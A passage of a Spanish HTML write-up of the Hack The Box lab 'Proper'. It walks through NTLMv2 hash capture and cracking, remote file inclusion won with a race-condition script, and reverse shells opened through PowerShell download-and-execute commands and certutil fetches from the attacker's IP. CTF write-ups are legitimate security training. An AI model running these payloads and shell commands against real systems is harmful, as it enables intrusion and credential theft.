&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creamos un archivo (&lt;code&gt;toctoc.php&lt;/code&gt;) y tendr√° este contenido (o cualquier otro):&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Podemos hacer el mismo proceso, pero con el archivo &lt;code&gt;header.inc&lt;/code&gt;, solo que en la petici√≥n pondr√≠amos √∫nicamente nuestra carpeta compartida (recordemos que la misma funci√≥n agrega &lt;code&gt;/header.inc&lt;/code&gt; al final).&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;‚ù≠ cat toctoc.php
&amp;lt;?php system(&quot;ping -c 1 10.10.14.178&quot;); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Aunque si todo va bien, deber√≠amos ver el error de &lt;code&gt;tempering&lt;/code&gt;, ya que &lt;code&gt;&amp;lt;?&lt;/code&gt; existe en el archivo‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y desde la petici√≥n hacemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 licenses.py &quot;\\\10.10.14.178\\smbFolder\\toctoc.php&quot;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En nuestra carpeta compartida tenemos respuesta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[*] Incoming connection (10.10.10.231,63214)
[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
[*] User PROPER\web authenticated successfully
[*] web::PROPER:aaaaaaaaaaaaaaaa:daf4f08da81ca1e00259289c66835220:010100000000000080b0c6bcc921d701671afff0fbf20627000000000100100070006d004f005a00460041007a006f000300100070006d004f005a00460041007a006f000200100075004100590057004200610076004f000400100075004100590057004200610076004f000700080080b0c6bcc921d7010600040002000000080030003000000000000000000000000020000085e4cbc8f5cc59435a6b4c52725d8e804fa85d00514be6c0b958277c8fa029f80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000
[*] Closing down connection (10.10.10.231,63214)
[*] Remaining connections []
...
# Lo hace muchas veces, asi que obtenemos varias veces una respuesta.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, tenemos el hash &lt;a href=&quot;https://geeks.ms/juansa/2008/12/26/seguridad-autenticarse-ntlm-ntlmv2-kerberos/&quot;&gt;Net NTLMv2&lt;/a&gt; del usuario del servidor web, en este caso de &lt;code&gt;PROPER/web&lt;/code&gt; :P Probemos a crackearla, quiz√°s es d√©bil‚Ä¶&lt;/p&gt;

&lt;p&gt;Tomamos &lt;code&gt;web::PROPER:a.....0000&lt;/code&gt; y lo guardamos en un archivo, lo llamar√© &lt;code&gt;hash&lt;/code&gt; e intentamos crackearlo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ john --wordlist=/usr/share/wordlists/rockyou.txt hash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En un rato vemos esto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
charlotte123!    (web)
1g 0:00:00:02 DONE (2021-03-26 25:25) 0.4629g/s 458800p/s 458800c/s 458800C/s charlotte1990..charlieishot
Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfectooooooooooooooooo, tenemos una contrase√±a del usuario &lt;strong&gt;web&lt;/strong&gt; (: peroooo ¬ød√≥nde las usamos? :O En el portal de licencias no logramos nada jugando con mails‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pa leer: &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;&lt;strong&gt;NTLM relay&lt;/strong&gt; y explicaciones interesantes&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Pa ver: &lt;a href=&quot;https://www.youtube.com/watch?v=fIGvOGrdxyc&amp;amp;t=2794s&quot;&gt;Youtube - &lt;strong&gt;S4vitar&lt;/strong&gt; explicando &lt;strong&gt;Net-NTLM&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volviendo a la respuesta de la petici√≥n que hicimos hacia nuestra carpeta compartida nos da un fallo todo lindo (pero al menos es diferente):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;!-- [2] include(\\10.10.14.178\smbFolder\toctoc.php/header.inc): failed to open stream: Invalid argument
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üé∫ &lt;strong&gt;&lt;em&gt;Jugu√© con &lt;code&gt;null bytes&lt;/code&gt;, agregando &lt;code&gt;URL Encode&lt;/code&gt; (sale el error del &lt;code&gt;tampering&lt;/code&gt;), di espacios para que tomara el archivo del folder y despu√©s el header, agregue dentro del archivo &lt;code&gt;header.inc&lt;/code&gt; c√≥digo &lt;code&gt;PHP&lt;/code&gt; y c√≥digo &lt;code&gt;html&lt;/code&gt; para ver si lo interpretaba o al menos no sal√≠a el error anterior&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;, pero nada :(&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ac√° estoy dudando si es que mi carpeta compartida en &lt;code&gt;SMB&lt;/code&gt; tiene alg√∫n error (ya que sale el error &lt;code&gt;Invalid Argument&lt;/code&gt;, y buscando referencian que es por no escapar &lt;code&gt;\&lt;/code&gt;, pero si las escap√©) o no s√© si es que deba salir ese error pero que por detr√°s si se esta subiendo el archivo‚Ä¶ De las pruebas que he hecho no veo que esto √∫ltimo este pasando.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;De pura locura me puse a revisar el archivo &lt;code&gt;smbserver.py&lt;/code&gt; (porque si) y me di cuenta de que podemos levantar la carpeta compartida con un usuario‚Ä¶ ¬øY si intentamos compartirla como si fu√©ramos &lt;code&gt;web&lt;/code&gt;? Quiz√°s el problema es la autenticaci√≥n y por eso no lograba la conexi√≥n con el archivo, intent√©moslo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 smbserver.py smbFolder $(pwd) -smb2support -username web -password &quot;charlotte123!&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora lanzamos la petici√≥n a ver si lee nuestro archivo, usemos el &lt;code&gt;header.inc&lt;/code&gt; de &lt;code&gt;solar&lt;/code&gt; pero con una modificaci√≥n para identificarlo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat header.inc
&amp;lt;h2&amp;gt;Este es mi tema perri&amp;lt;/h2&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 licenses.py &quot;\\\10.10.14.178\\smbFolder&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos en nuestra carpeta compartida:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;...
[*] Incoming connection (10.10.10.231,61502)
[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
[*] User PROPER\web authenticated successfully
[*] web::PROPER:aaaaaaaaaaaaaaaa:c806c7a6bcdc62ef33e516d7483e4856:0101000000000000005dc3b16922d70131c01ee481185b30000000000100100044006a007a004e0057007200450044000300100044006a007a004e0057007200450044000200100077004300750050006200490047005900040010007700430075005000620049004700590007000800005dc3b16922d70106000400020000000800300030000000000000000000000000200000094df3dcd57d3446771048246011a53ff8eff1656c86731c3bcd89f72886362a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000
[*] Connecting Share(1:SMBFOLDER)
[*] Disconnecting Share(1:SMBFOLDER)
[*] Closing down connection (10.10.10.231,61502) 
[*] Remaining connections []
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en la petici√≥n vemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;...
[+] &quot;Theme&quot;: \\10.10.14.178\smbFolder -&amp;gt; ?theme=\\10.10.14.178\smbFolder&amp;amp;h=9958fc71043a62ab691ff2a8f9e77b52
&amp;lt;!DOCTYPE html&amp;gt;
    &amp;lt;h2&amp;gt;Este es mi tema perri&amp;lt;/h2&amp;gt;
    &amp;lt;html lang=&quot;en&quot;&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
        &amp;lt;title&amp;gt;Licenses&amp;lt;/title&amp;gt;
        &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
        &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;solar/bootstrap.min.css&quot;&amp;gt;
    &amp;lt;/head&amp;gt;

  &amp;lt;body&amp;gt;
  ...
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOoowowowo&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lo que hace es: &lt;code&gt;include(\\10.10.14.178\smbFolder/header.inc)&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;En &lt;code&gt;Burp&lt;/code&gt; se ve m√°s lindo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_RFI_headerINC_done.png&quot; alt=&quot;321burp_RFI_headerINC_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien bien, tenemos entonces &lt;a href=&quot;https://www.cyberseguridad.net/inclusion-de-ficheros-remotos-rfi-remote-file-inclusion-ataques-informaticos-ii&quot;&gt;Remote File Inclusion&lt;/a&gt; confirmado (que resumidamente es incluir un archivo externo al servidor).&lt;/p&gt;

&lt;p&gt;Ahora debemos lidiar con &lt;code&gt;strpos&lt;/code&gt;, a ver como podemos bypassear esa parte y lograr subir nuestra Shell‚Ä¶ O que interprete nuestro archivo externo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat header.inc
&amp;lt;h2&amp;gt;Este es mi tema perri&amp;lt;/h2&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y obtenemos efectivamente el error:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 licenses.py &quot;\\\10.10.14.178\\smbFolder&quot;

[+] &quot;Theme&quot;: \\10.10.14.178\smbFolder -&amp;gt; ?theme=\\10.10.14.178\smbFolder&amp;amp;h=9958fc71043a62ab691ff2a8f9e77b52
Forbidden - Tampering attempt detected.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Intentando crear un payload (llamado &lt;code&gt;header.inc&lt;/code&gt;) con &lt;code&gt;msfvenom&lt;/code&gt; para inyectarlo en la web logramos que lo lea, pero no que lo interprete. As√≠ que si o si debemos inyectar c√≥digo &lt;code&gt;.php&lt;/code&gt; para que sea interpretado (ejecutado) por la web‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;web-racecondition&quot;&gt;Intentamos &lt;u&gt;Race Condition&lt;/u&gt; para sobreescribir contenido del objeto &lt;u&gt;header.inc&lt;/u&gt; con c√≥digo &lt;u&gt;PHP&lt;/u&gt; &lt;a href=&quot;#web-racecondition&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Jmmm d√°ndole varias vueltas podemos pensar algo: La web esta buscando el archivo &lt;code&gt;header.inc&lt;/code&gt; cierto? Listo, lo creamos en nuestra carpeta compartida y la web logra leerlo YYY ejecutarlo‚Ä¶ Ac√° f√°cil, pero no podemos simplemente cambiar el contenido del archivo por c√≥digo &lt;code&gt;p&lt;/code&gt;, ya que la primera validaci√≥n es que si encuentra &lt;code&gt;&amp;lt;?&lt;/code&gt; dentro del contenido del archivo, el proceso ser√° cancela y nos mostrara un error‚Ä¶&lt;/p&gt;

&lt;p&gt;Pero ¬øy si intentamos modificar el contenido del archivo &lt;code&gt;header.inc&lt;/code&gt; por c√≥digo &lt;code&gt;php&lt;/code&gt; al mismo tiempo en que la web lo busca al hacer la solicitud? WTF&lt;/p&gt;

&lt;p&gt;Podr√≠amos hacer que inicialmente tome el contenido del archivo &lt;code&gt;header.inc&lt;/code&gt; (HTML to lindo sin &lt;code&gt;&amp;lt;?&lt;/code&gt;), esto har√° que pase el filtro de la funci√≥n &lt;code&gt;strpos&lt;/code&gt; y mientras hace el &lt;code&gt;include&lt;/code&gt; modificamos el contenido del archivo para que tome nuestro payload y finalmente estar√≠a interpret√°ndolo‚Ä¶&lt;/p&gt;

&lt;p&gt;Que ser√≠a un &lt;code&gt;race condition&lt;/code&gt;, donde existe un proceso ejecut√°ndose peeeero nosotros al mismo tiempo intentamos ser m√°s r√°pidos y as√≠ ejecutar lo que necesitemos dentro de ese proceso (&lt;strong&gt;ganar&lt;/strong&gt;, por eso es llamada &lt;strong&gt;race&lt;/strong&gt;)‚Ä¶&lt;/p&gt;

&lt;p&gt;‚ö†Ô∏èüõë‚ö†Ô∏è &lt;strong&gt;Esto son peque√±os spoilers de m√°quinas retiradas, por si algo :P&lt;/strong&gt; ‚ö†Ô∏èüõë‚ö†Ô∏è&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=BFSdJYS1gFs&amp;amp;t=4600&quot;&gt;&lt;strong&gt;IppSec&lt;/strong&gt; lo usa para hacer un link simb√≥lico al &lt;strong&gt;id_rsa&lt;/strong&gt; de un usuario, donde realmente deber√≠a estar mostrando un simple mensaje&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=ehoh6g5dSWk&amp;amp;t=3560s&quot;&gt;&lt;strong&gt;IppSec&lt;/strong&gt; de nuevo nos muestra como logra inyectar c√≥digo &lt;strong&gt;PHP&lt;/strong&gt; mientras sube un archivo que no deber√≠a tener &lt;strong&gt;PHP&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://0xdf.gitlab.io/2020/08/29/htb-quick.html#method-1-read-as-srvadm&quot;&gt;&lt;strong&gt;0xdf&lt;/strong&gt; explica detalladamente como hacer un link simb√≥lico de nuevo al &lt;strong&gt;id_rsa&lt;/strong&gt; mientras se genera un simple mensaje&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Esta imagen me gusto mucho, es tomada de &lt;a href=&quot;https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html&quot;&gt;ac√°&lt;/a&gt;, pero creo que originalmente es tomada de &lt;a href=&quot;http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/&quot;&gt;este graaaaaaaan articulo&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_condicion_carrera_php.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Bien, ahora que sabemos que es un &lt;code&gt;race condition&lt;/code&gt;, intent√©moslo mediante un &lt;code&gt;script&lt;/code&gt; que ejecutaremos despu√©s de lanzar la petici√≥n:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Voy a crear una carpeta llamada &lt;code&gt;header&lt;/code&gt; en donde estar√° el archivo &lt;code&gt;header.inc&lt;/code&gt; simplemente, as√≠ es m√°s sencillo hacer todo :P&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;raceee.sh&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

# Nos situamos donde este header.inc y lo regeneramos con contenido valido
cd header/
cat ../baksolarheader &amp;gt; header.inc

for i in {1..5000}; do
    # Bucle sobre todos los archivos de la carpeta header/
    for file in *; do
        # Si el archivo existe y tenemos permisos de lectura...
        if [[ -r $file ]]; then
            # Borramos y generamos el nuevo header.inc pero con el contenido PHP, esto 5000 veces
            rm -rf $file
            cat ../ajatuque.php &amp;gt; $file

            # O mediante un link simbolico al archivo PHP
            #ln -f -s ../ajatuque.php $file
        fi
    done
done

# Dejamos todo como estaba...
rm -rf $file
cat ../baksolarheader &amp;gt; header.inc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces el script sencillamente itera 5000 veces, donde cada una recorre los archivo de la carpeta &lt;code&gt;header/&lt;/code&gt; (que solo tiene &lt;code&gt;header.inc&lt;/code&gt;) y una vez tenemos el nombre del archivo (con &lt;code&gt;$file&lt;/code&gt;, o sea que ser√≠a siempre igual a &lt;code&gt;header.inc&lt;/code&gt;), lo borramos y copiamos el contenido del archivo &lt;code&gt;PHP&lt;/code&gt; (con el c√≥digo a inyectar) sobre uno llamado &lt;code&gt;header.inc&lt;/code&gt; en la misma ruta‚Ä¶&lt;/p&gt;

&lt;p&gt;O tambi√©n podr√≠amos hacer el proceso, pero que en vez de copiar el contenido del &lt;code&gt;PHP&lt;/code&gt; nos genere un link simb√≥lico hacia √©l y una vez lea (llame/tome/etc) el archivo &lt;code&gt;header.inc&lt;/code&gt; estar√≠a leyendo realmente el contenido del archivo &lt;code&gt;PHP&lt;/code&gt;. De cualquiera de las dos formas sirve, entonces probemos:&lt;/p&gt;

&lt;p&gt;En el archivo &lt;code&gt;PHP&lt;/code&gt; vamos a simplemente agregar unas l√≠neas que nos impriman un mensaje y nos ejecuten un comando en el sistema, as√≠ sabemos si esta siendo interpretado y si tenemos &lt;code&gt;RCE&lt;/code&gt;, como ya vimos se llama &lt;code&gt;ajatuque.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php 
    echo &quot;\nPuede ser fayt?\n&quot;; 
    $coma=shell_exec(&quot;whoami&quot;); 
    echo $coma; 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creamos de nuevo nuestra carpeta compartida por &lt;code&gt;SMB&lt;/code&gt; pero ahora apuntando al directorio &lt;code&gt;/header&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 smbserver.py smbFolder $(pwd)/header -smb2support -username web -password &quot;charlotte123!&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Estos dos pasos los tenemos que hacer casi simult√°neos, solo debemos darle unos 2-3 segundos a la petici√≥n, para que se haga primero y tome el contenido &lt;strong&gt;v√°lido&lt;/strong&gt; del archivo &lt;code&gt;header.inc&lt;/code&gt; (bypasseamos &lt;code&gt;strpos&lt;/code&gt;) y ah√≠ si ejecutamos el script para que modifique el contenido del &lt;code&gt;.inc&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lanzamos petici√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 licenses.py &quot;\\\10.10.14.178\\smbFolder&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esperamos 2 segundos y ejecutamos el script, vemos respuesta en nuestra carpeta &lt;code&gt;SMB&lt;/code&gt; y como el resultado en la petici√≥n es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 licenses.py &quot;\\\10.10.14.178\\smbFolder&quot;

[+] &quot;Theme&quot;: \\10.10.14.178\smbFolder -&amp;gt; ?theme=\\10.10.14.178\smbFolder&amp;amp;h=9958fc71043a62ab691ff2a8f9e77b52

Puede ser fayt?
proper\web

  &amp;lt;body&amp;gt;
  ...
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_race_condition_won_RCE.png&quot; alt=&quot;321bash_race_condition_won_RCE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Claro que siiiiiiiiiii, tenemos ejecuci√≥n remota de comandos mediante un &lt;code&gt;race condition&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¬°Que lindura oiga!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_gif_wellLETSgo.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listos, pues ahora intentemos generar una Reverse Shell:&lt;/p&gt;

&lt;p&gt;Lo haremos mediante el archivo &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; del repo &lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/Shells&quot;&gt;nishang&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;Entonces, nos clonamos el repo (o solo el archivo, yo le cambi√© el nombre a &lt;code&gt;IpsTcp.ps1&lt;/code&gt;), lo abrimos y nos copiamos (o movemos) esta l√≠nea:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;‚ù≠ cat IpsTcp.ps1
...
# Aprox linea 18
PS &amp;gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos vamos al final del archivo y la pegamos, pero cambiando la IP y el PUERTO donde queremos recibir la Reverse Shell, tambi√©n le quitamos el &lt;code&gt;PS &amp;gt;&lt;/code&gt; del inicio:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.178 -Port 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos‚Ä¶&lt;/p&gt;

&lt;p&gt;Lo que haremos ser√° indicarle mediante el &lt;code&gt;RCE&lt;/code&gt; que haga una petici√≥n a este archivo, lo leer√°, pero como al final tenemos una l√≠nea sin comentarios y dispuesta a ser ejecutada, har√° eso, interpretara el archivo y se ejecutara esa l√≠nea, la cual har√° la petici√≥n hacia esa direcci√≥n IP y el puerto, que es donde estaremos escuchando y nos devolver√° una PowerShell :)&lt;/p&gt;

&lt;p&gt;Modificamos el comando en el archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php 

system(&quot;powershell -c \&quot;IEX(New-Object Net.WebClient).downloadString('http://10.10.14.178:8000/IpsTcp.ps1')\&quot;&quot;);

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Levantamos el servidor web: &lt;code&gt;python3 -m http.server&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Nos ponemos en escucha por el puerto &lt;code&gt;4433&lt;/code&gt;: &lt;code&gt;rlwrap nc -lvp 4433&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Ejecutamos petici√≥n al la carpeta compartida: &lt;code&gt;python3 licenses.py &quot;\\\10.10.14.178\\smbFolder&quot;&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Esperamos 2-3 segundos y ejecutamos el script &lt;code&gt;raceee.sh&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Yyyy:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_webSH.png&quot; alt=&quot;321bash_webSH&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listos, tenemos una PowerShell como el usuario &lt;code&gt;web&lt;/code&gt; dentro del sistema :) En este caso no podemos hacer tratamiento de‚Ä¶. ¬øQu√© no? JAAAAA! Dando vueltas encontramos un recurso que nos permite obtener una consola &lt;strong&gt;PowerShell&lt;/strong&gt; Full TTY, en la que podemos hacer &lt;strong&gt;CTRL+C&lt;/strong&gt;, tener hist√≥rico de comandos y movernos entre ellos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/antonioCoco/ConPtyShell&quot;&gt;https://github.com/antonioCoco/ConPtyShell&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Siguiendo los pasos del repo, nos indica el uso, descarguemos el archivo en la m√°quina para migrarnossss:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\\Users\web\Videos&amp;gt; certutil.exe -f -urlcache -split http://10.10.14.164:8000/Invoke-ConPtyShell.ps1 Invoke-ConPtyShell.ps1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En nuestra m√°quina atacante nos ponemos en escucha y vemos el tama√±o de nuestra pantalla, esto lo usaremos ahorita:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ stty size
43 192
‚ù≠ nc -lvp 4434
listening on [any] 4434 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ejecutamos en la m√°quina v√≠ctima la petici√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\\Users\web\Videos&amp;gt; IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.10.14.164 -RemotePort 4434 -Rows 43 -Cols 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la petici√≥n y ahora hacemos el tratamiento normal de la TTY:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Hacemos &lt;code&gt;CTRL + Z&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Escribimos &lt;code&gt;stty raw -echo&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Escribimos &lt;code&gt;fg&lt;/code&gt; (aunque no se vea).&lt;/li&gt;
  &lt;li&gt;Damos &lt;code&gt;enter&lt;/code&gt; y tamos full.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nc -lvp 4434
listening on [any] 4434 ...
connect to [10.10.14.164] from proper.htb [10.10.10.231] 49336
^Z
[1]+  Detenido                nc -lvp 4434

‚ù≠ stty raw -echo
# Ac√° va el &quot;fg&quot;
‚ù≠ nc -lvp 4434
       # Damos enter y obtenemos...
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\licenses&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y tenemos una &lt;code&gt;PowerShell&lt;/code&gt; totalmente interactivaaaaaaaaaaaaaaaaaaaaaaaaaaa. Podemos hacer &lt;code&gt;CTRL + C&lt;/code&gt;, historial y movernos entre comandos. &lt;span style=&quot;color: yellow;&quot;&gt;QU√â recursazo!!&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Ahora a enumerar‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Dando vueltas en la ra√≠z encontramos este recurso llamativo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files&amp;gt; dir

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/15/2020   4:05 AM                Cleanup
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; dir

    Directory: C:\Program Files\Cleanup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/15/2020   4:03 AM        2999808 client.exe
-a----       11/15/2020   9:22 AM            174 README.md
-a----       11/15/2020   5:20 AM        3041792 server.exe

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Interesante, ejecutandolos tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; type README.md
# Cleanup

We find the garbage on your system and delete it!

## Changelog

- 31.10.2020 - Alpha Release

## Todo

- Create an awesome GUI
- Check additional paths
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; .\client.exe
Cleaning C:\\Users\web\Downloads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jmm esta borrando archivos de la ruta &lt;code&gt;C:\\Users\web\Downloads&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; ls -force c:\\Users\web\Downloads
PS C:\Program Files\Cleanup&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

